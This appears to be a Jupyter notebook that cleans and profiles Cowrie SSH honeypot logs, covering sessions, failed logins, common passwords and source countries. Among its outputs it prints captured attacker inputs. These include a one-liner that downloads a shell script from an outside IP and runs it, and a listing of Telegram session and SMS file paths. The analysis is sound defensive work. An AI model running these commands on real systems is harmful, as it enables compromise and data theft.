9074,2025-06-10 02:38:14.161000+00:00,2025-06-10 02:38:14.161091+00:00,vm-centralus,Connection lost after 0.1 seconds,9aca1bb4ae93,0.1,40.86.6.196,196.251.114.29,cowrie.session.closed,1416c5253ab6,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
9075,2025-06-10 02:41:53.369000+00:00,2025-06-10 02:41:53.369392+00:00,vm-centralus,New connection: 80.90.185.250:33370 (172.19.0....,9aca1bb4ae93,NaN,40.86.6.196,80.90.185.250,cowrie.session.connect,85911d361189,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
9076,2025-06-10 02:41:53.370000+00:00,2025-06-10 02:41:53.370122+00:00,vm-centralus,Remote SSH version: SSH-2.0-Go,9aca1bb4ae93,NaN,40.86.6.196,80.90.185.250,cowrie.client.version,85911d361189,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
9077,2025-06-10 02:41:53.520000+00:00,2025-06-10 02:41:53.520930+00:00,vm-centralus,SSH client hassh fingerprint: 084386fa7ae5039b...,9aca1bb4ae93,NaN,40.86.6.196,80.90.185.250,cowrie.client.kex,85911d361189,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
9078,2025-06-10 02:42:01.372000+00:00,2025-06-10 02:42:01.372218+00:00,vm-centralus,Connection lost after 8.0 seconds,9aca1bb4ae93,8.0,40.86.6.196,80.90.185.250,cowrie.session.closed,85911d361189,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN


In [ ]:
sample_session = cowrie_ssh["session"].sample(5, random_state=42)

for s in sample_session:
    print("="*80)
    print(s)

    display(
        cowrie_ssh[cowrie_ssh["session"]==s][
            ["@timestamp","eventid","message"]
        ].sort_values("@timestamp")
    )

dd746274d66f


,@timestamp,eventid,message
1397,2025-06-09 20:39:09.276000+00:00,cowrie.session.connect,New connection: 66.240.236.116:57678 (172.18.0...
1398,2025-06-09 20:39:09.277000+00:00,cowrie.client.version,Remote SSH version: SSH-2.0-Go
1399,2025-06-09 20:39:09.330000+00:00,cowrie.client.kex,SSH client hassh fingerprint: 084386fa7ae5039b...
1400,2025-06-09 20:39:19.277000+00:00,cowrie.session.closed,Connection lost after 10.0 seconds


2dce8f271035


,@timestamp,eventid,message
7186,2025-06-10 00:39:45.068000+00:00,cowrie.session.connect,New connection: 103.140.238.42:39570 (172.19.0...
7187,2025-06-10 00:39:45.071000+00:00,cowrie.client.version,Remote SSH version: SSH-2.0-Go
7192,2025-06-10 00:39:45.462000+00:00,cowrie.client.kex,SSH client hassh fingerprint: 0a07365cc01fa9fc...
7214,2025-06-10 00:39:46.262000+00:00,cowrie.login.failed,login attempt [flink/flink123] failed
7243,2025-06-10 00:39:47.570000+00:00,cowrie.session.closed,Connection lost after 2.5 seconds


6e356fef0b66


,@timestamp,eventid,message
743,2025-06-09 19:58:32.241000+00:00,cowrie.session.connect,New connection: 196.251.84.225:37724 (172.20.0...
744,2025-06-09 19:58:32.242000+00:00,cowrie.client.version,Remote SSH version: SSH-2.0-Go
745,2025-06-09 19:58:32.439000+00:00,cowrie.client.kex,SSH client hassh fingerprint: 5f904648ee8964be...
746,2025-06-09 19:58:33.666000+00:00,cowrie.login.failed,login attempt [samba/samba] failed
747,2025-06-09 19:58:34.939000+00:00,cowrie.session.closed,Connection lost after 2.7 seconds


df5820bbfabc


,@timestamp,eventid,message
1486,2025-06-09 20:43:07.742000+00:00,cowrie.client.version,Remote SSH version: SSH-2.0-Go
1487,2025-06-09 20:43:07.742000+00:00,cowrie.session.connect,New connection: 64.62.197.140:13645 (172.20.0....
1488,2025-06-09 20:43:08.067000+00:00,cowrie.client.kex,SSH client hassh fingerprint: 7216c7c473918b4f...
1489,2025-06-09 20:43:11.743000+00:00,cowrie.session.closed,Connection lost after 4.0 seconds


51304ce7b705


,@timestamp,eventid,message
265,2025-06-09 19:51:38.963000+00:00,cowrie.session.connect,New connection: 134.199.160.187:57780 (172.20....
266,2025-06-09 19:51:38.965000+00:00,cowrie.client.version,Remote SSH version: SSH-2.0-Go
267,2025-06-09 19:51:39.399000+00:00,cowrie.client.kex,SSH client hassh fingerprint: 0a07365cc01fa9fc...
268,2025-06-09 19:51:40.399000+00:00,cowrie.login.failed,login attempt [observer/observer] failed
272,2025-06-09 19:51:41.674000+00:00,cowrie.session.closed,Connection lost after 2.7 seconds


In [ ]:
important = [
    "@timestamp",
    "eventid",
    "session",
    "src_ip",
    "protocol"
]

cowrie_ssh[important].isna().sum()

,0
@timestamp,0
eventid,0
session,0
src_ip,0
protocol,0


In [ ]:
cowrie_ssh["protocol"].value_counts(dropna=False)

,count
protocol,
ssh,9079


In [ ]:
cowrie_ssh["eventid"].value_counts()

,count
eventid,
cowrie.session.connect,1973
cowrie.session.closed,1973
cowrie.client.version,1927
cowrie.client.kex,1522
cowrie.login.failed,1497
cowrie.command.input,50
cowrie.session.params,43
cowrie.log.closed,43
cowrie.login.success,27


In [ ]:
all_sessions = set(cowrie_ssh["session"].unique())

closed_sessions = set(
    cowrie_ssh[
        cowrie_ssh["eventid"] == "cowrie.session.closed"
    ]["session"].unique()
)

In [ ]:
print(len(all_sessions - closed_sessions))

0


In [ ]:
cowrie_ssh[
    ["session","@timestamp","eventid"]
].duplicated().sum()

np.int64(0)

In [ ]:
cowrie_ssh = cowrie_ssh.sort_values(
    ["session","@timestamp"]
).reset_index(drop=True)

In [ ]:
cowrie_ssh["duration"].describe()

,duration
count,2016.000000
mean,3.061855
std,12.685721
min,0.000000
25%,1.700000
50%,2.100000
75%,2.400000
max,194.800000


In [ ]:
cowrie_ssh["username"].value_counts().head(20)

,count
username,
root,353
admin,43
test,32
oracle,28
ubuntu,28
steam,25
user,24
hadoop,23
postgres,20


In [ ]:
cowrie_ssh["password"].value_counts().head(20)

,count
password,
123456,246
123,59
password,26
1,24
admin,17
abc123,13
111111,12
1qaz@WSX,12
12345678,12


In [ ]:
cowrie_ssh["src_ip"].nunique()

76

In [ ]:
cowrie_ssh["geoip.country_name"].value_counts().head(20)

,count
geoip.country_name,
Australia,3035
The Netherlands,2893
United States,1412
Hong Kong,1252
Vietnam,132
China,126
Germany,68
South Korea,48
Taiwan,25


In [ ]:
cowrie_ssh["input"].dropna().value_counts().head(20)

,count
input,
uname -s -v -n -r -m,8
/ip cloud print,6
uname -a,5
cd /tmp; wget http://213.209.143.44/ssh.sh -O- |sh;curl -o http://213.209.143.44/ssh.sh -O-|sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh,3
ifconfig,3
cat /proc/cpuinfo,3
ps | grep '[Mm]iner',3
ps -ef | grep '[Mm]iner',3
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*,3


In [ ]:
cowrie_ssh[
    cowrie_ssh["eventid"]=="cowrie.session.file_upload"
][["filename","shasum","src_ip"]]

,filename,shasum,src_ip
2008,sshd,52b070d4137efa4f75ced91177228bce8a3209341defff...,160.191.3.29
2764,sshd,1fdd1176933a786be5aec4814c143f4a192a32284a015b...,158.51.96.38
2864,sshd,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b93...,180.76.166.65
5553,sshd,213e254beea6489dfd774d8e7dac3d4651565da1317a48...,176.215.246.166


In [ ]:
cowrie_ssh[
    cowrie_ssh["eventid"]=="cowrie.session.file_download"
][["url","filename","src_ip"]]

,url,filename,src_ip
226,http://213.209.143.44/ssh.sh,NaN,176.65.148.10
1421,http://213.209.143.44/ssh.sh,NaN,176.65.148.10
4144,NaN,NaN,121.41.34.115
4145,NaN,NaN,121.41.34.115
6721,NaN,NaN,206.189.61.226
8682,http://213.209.143.44/ssh.sh,NaN,176.65.148.10


In [ ]:
cowrie_ssh = cowrie_ssh.drop_duplicates(
    subset=["session","@timestamp","eventid"]
)

In [ ]:
(cowrie_ssh["duration"] < 0).sum()

np.int64(0)

In [ ]:
cowrie_ssh = cowrie_ssh.sort_values(
    ["session","@timestamp"]
).reset_index(drop=True)

In [ ]:
cowrie_ssh[
    cowrie_ssh["eventid"]=="cowrie.session.connect"
].groupby("session").size().value_counts()

,count
1,1973


In [ ]:
cowrie_ssh[
    cowrie_ssh["eventid"]=="cowrie.session.closed"
].groupby("session").size().value_counts()

,count
1,1973


In [ ]:
cowrie_ssh.to_csv(
    "cowrie_ssh_clean_final.csv",
    index=False
)

In [ ]:
cowrie_ssh.to_json(
    "cowrie_ssh_clean_final.json",
    orient="records",
    lines=True
)

In [ ]:
print(cowrie_ssh.shape)
print(cowrie_ssh.columns.tolist())

(9079, 77)
['@timestamp', 'timestamp', 't-pot_hostname', 'message', 'sensor', 'duration', 't-pot_ip_ext', 'src_ip', 'eventid', 'session', 'host', 't-pot_ip_int', 'geoip_ext.country_code2', 'geoip_ext.country_name', 'geoip_ext.location.lat', 'geoip_ext.location.lon', 'geoip_ext.country_code3', 'geoip_ext.longitude', 'geoip_ext.region_name', 'geoip_ext.city_name', 'geoip_ext.asn', 'geoip_ext.postal_code', 'geoip_ext.ip', 'geoip_ext.continent_code', 'geoip_ext.as_org', 'geoip_ext.region_code', 'geoip_ext.timezone', 'geoip_ext.latitude', 'geoip.country_code2', 'geoip.country_name', 'geoip.location.lat', 'geoip.location.lon', 'geoip.country_code3', 'geoip.longitude', 'geoip.asn', 'geoip.ip', 'geoip.continent_code', 'geoip.as_org', 'geoip.timezone', 'geoip.latitude', 'headers.content_length', 'headers.http_accept', 'src_port', 'dest_ip', 'dest_port', 'protocol', 'ip_rep', 'geoip.region_name', 'geoip.city_name', 'geoip.region_code', 'username', 'password', 'geoip.postal_code', 'encCS', 'kexAl

In [ ]:
cols_to_drop = [
    "height",
    "width",
    "id"
]

cowrie_ssh = cowrie_ssh.drop(columns=cols_to_drop)

In [ ]:
print(cowrie_ssh.shape)

(9079, 74)


In [ ]:

cowrie_ssh_final = cowrie_ssh.copy()

In [ ]:
cowrie_ssh_final.to_csv(
    "cowrie_ssh_clean_final.csv",
    index=False
)

In [ ]:
cowrie_ssh_final.to_json(
    "cowrie_ssh_clean_final.json",
    orient="records",
    indent=4
)

In [ ]:
all_nan = cowrie_ssh.columns[cowrie_ssh.isna().all()].tolist()
print(all_nan)

['headers.http_accept']


In [ ]:
list_cols = []

for col in cowrie_ssh.columns:
    if cowrie_ssh[col].apply(lambda x: isinstance(x, list)).any():
        list_cols.append(col)

print(list_cols)

['encCS', 'kexAlgs', 'macCS', 'keyAlgs', 'compCS', 'langCS']


In [ ]:
temp = cowrie_ssh.copy()

In [ ]:
list_cols = [
    "macCS",
    "langCS",
    "keyAlgs",
    "kexAlgs",
    "encCS",
    "compCS"
]

for col in list_cols:
    temp[col] = temp[col].astype(str)

In [ ]:
print(temp.duplicated().sum())

0


In [ ]:
del temp

In [ ]:
print(cowrie_ssh.shape)

print("Columns:", len(cowrie_ssh.columns))

print("Sessions:", cowrie_ssh["session"].nunique())

print("All-Null Columns:", cowrie_ssh.isna().all().sum())

(9079, 74)
Columns: 74
Sessions: 1973
All-Null Columns: 1


In [ ]:
null_cols = cowrie_ssh.columns[cowrie_ssh.isna().all()]
print(null_cols.tolist())

['headers.http_accept']


In [ ]:
cowrie_ssh.drop(columns=["headers.http_accept"], inplace=True)

In [ ]:
print(cowrie_ssh.shape)

(9079, 73)


In [ ]:
cowrie_ssh.to_csv(
    "cowrie_ssh_clean_final.csv",
    index=False
)

print("CSV Saved Successfully ✅")

CSV Saved Successfully ✅


In [ ]:
cowrie_ssh.to_csv(
    "cowrie_ssh_preprocessed.csv",
    index=False
)

print("CSV Saved Successfully ✅")

CSV Saved Successfully ✅


In [ ]:
# Save Final Clean SSH Dataset (CSV)
cowrie_ssh.to_csv(
    "cowrie_ssh_clean_final.csv",
    index=False
)

# Save Final Clean SSH Dataset (JSON)
cowrie_ssh.to_json(
    "cowrie_ssh_clean_final.json",
    orient="records",
    indent=4
)

print("Files Saved Successfully!")

✅ Files Saved Successfully!


In [ ]:
cowrie_ssh.to_json(
    "cowrie_ssh_preprocessed.json",
    orient="records",
    indent=4
)

print("JSON Saved Successfully ✅")

JSON Saved Successfully ✅
